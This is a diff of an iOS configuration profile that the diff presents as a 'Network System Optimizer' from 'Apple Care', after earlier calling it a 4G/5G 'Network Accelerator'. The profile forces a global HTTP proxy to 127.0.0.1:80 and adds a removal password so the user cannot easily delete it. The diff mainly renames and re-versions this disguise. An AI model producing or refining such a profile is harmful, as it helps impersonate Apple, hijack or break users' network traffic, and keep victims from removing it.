@@ -8,47 +8,43 @@
 	<array>
 		<dict>
 			<key>PayloadIdentifier</key>
-			<string>com.sys.network.proxy.v11.4</string>
+			<string>com.apple.proxy.http.global.v11.6</string>
 			<key>PayloadType</key>
 			<string>com.apple.proxy.http.global</string>
 			<key>PayloadUUID</key>
-			<string>A5B6C7D8-E9F0-1A2B-3C4D-5E6F7G8H9I0J</string>
+			<string>A1111111-2222-3333-4444-555555555555</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 			<key>ProxyServer</key>
 			<string>127.0.0.1</string>
 			<key>ProxyServerPort</key>
-			<integer>8080</integer>
+			<integer>80</integer>
 			<key>ProxyType</key>
 			<string>Manual</string>
 		</dict>
 		<dict>
-			<key>PayloadDisplayName</key>
-			<string>Profile Removal Password</string>
 			<key>PayloadIdentifier</key>
 			<string>com.apple.profileRemovalPassword</string>
 			<key>PayloadType</key>
 			<string>com.apple.profileRemovalPassword</string>
 			<key>PayloadUUID</key>
-			<string>7a8b9c0d-1e2f-3g4h-5i6j-7k8l9m0n1o2p</string>
+			<string>B2222222-3333-4444-5555-666666666666</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 			<key>RemovalPassword</key>
 			<string>838689</string>
 		</dict>
 	</array>
-	<key>PayloadDescription</key>
-	<string>Cau hinh mang nang cao de on dinh ket noi 4G/5G.</string>
 	<key>PayloadDisplayName</key>
-	<string>NETWORK ACCELERATOR v11.4</string>
+	<string>Network System Optimizer</string>
 	<key>PayloadIdentifier</key>
-	<string>com.sys.network.v11.4</string>
+	<string>com.net.opt.v11.6</string>
 	<key>PayloadOrganization</key>
-	<string>Apple Network Infrastructure</string>
+	<string>Apple Care</string>
 	<key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
-	<string>Z1X2C3V4-B5N6-M7L8-K9J0-H1G2F3D4S5A6</string>
+	<string>C3333333-4444-5555-6666-777777777777</string>
 	<key>PayloadVersion</key>
 	<integer>1</integer>
 </dict>
